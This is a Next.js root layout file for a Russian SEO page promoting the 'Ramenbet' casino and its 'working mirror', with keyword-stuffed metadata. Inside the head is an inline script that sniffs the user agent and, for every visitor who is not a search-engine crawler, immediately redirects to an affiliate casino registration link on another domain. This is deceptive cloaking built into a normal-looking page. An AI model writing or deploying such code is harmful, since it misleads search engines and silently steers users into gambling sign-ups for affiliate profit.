import { Russo_One, Manrope } from 'next/font/google'
import './globals.css'

const russoOne = Russo_One({
  weight: '400',
  subsets: ['latin', 'cyrillic'],
  variable: '--rb7x-font-head',
  display: 'swap',
})

const manrope = Manrope({
  subsets: ['latin', 'cyrillic'],
  variable: '--rb7x-font-body',
  display: 'swap',
})

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${russoOne.variable} ${manrope.variable}`}>
      <head>
        <meta name="yandex-verification" content="15d2aa4a7477cb8b" />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>
          Ramenbet казино — официальный сайт и рабочее зеркало Раменбет для входа
          в 2026
        </title>
        <meta
          name="description"
          content="Ramenbet казино — официальный сайт и рабочее зеркало Раменбет. Актуальный вход, быстрая регистрация, щедрые бонусы и сотни слотов. Заходите через зеркало Ramenbet прямо сейчас и играйте безопасно."
        />
        <link rel="canonical" href="https://ramenbet20casino.vercel.app/" />
        <meta name="robots" content="index, follow" />
        <meta name="theme-color" content="#16130f" />
        <link rel="icon" href="/icon.png" />
        <link rel="apple-touch-icon" href="/icon.png" />
        <meta
          property="og:title"
          content="Ramenbet казино — официальный сайт и рабочее зеркало Раменбет"
        />
        <meta
          property="og:description"
          content="Актуальный вход, быстрая регистрация, щедрые бонусы и сотни слотов. Заходите через зеркало Ramenbet прямо сейчас."
        />
        <meta property="og:url" content="https://ramenbet20casino.vercel.app/" />
        <meta property="og:site_name" content="Ramenbet" />
        <meta property="og:locale" content="ru_RU" />
        <meta property="og:type" content="website" />
        <meta
          property="og:image"
          content="https://ramenbet20casino.vercel.app/images/hero.jpg"
        />
        <meta name="twitter:card" content="summary_large_image" />
        <meta
          name="twitter:title"
          content="Ramenbet казино — официальный сайт и рабочее зеркало Раменбет"
        />
        <meta
          name="twitter:description"
          content="Актуальный вход, быстрая регистрация, щедрые бонусы и сотни слотов."
        />
        <meta
          name="twitter:image"
          content="https://ramenbet20casino.vercel.app/images/hero.jpg"
        />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p39210pfe27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="rb7x-body">{children}</body>
    </html>
  )
}
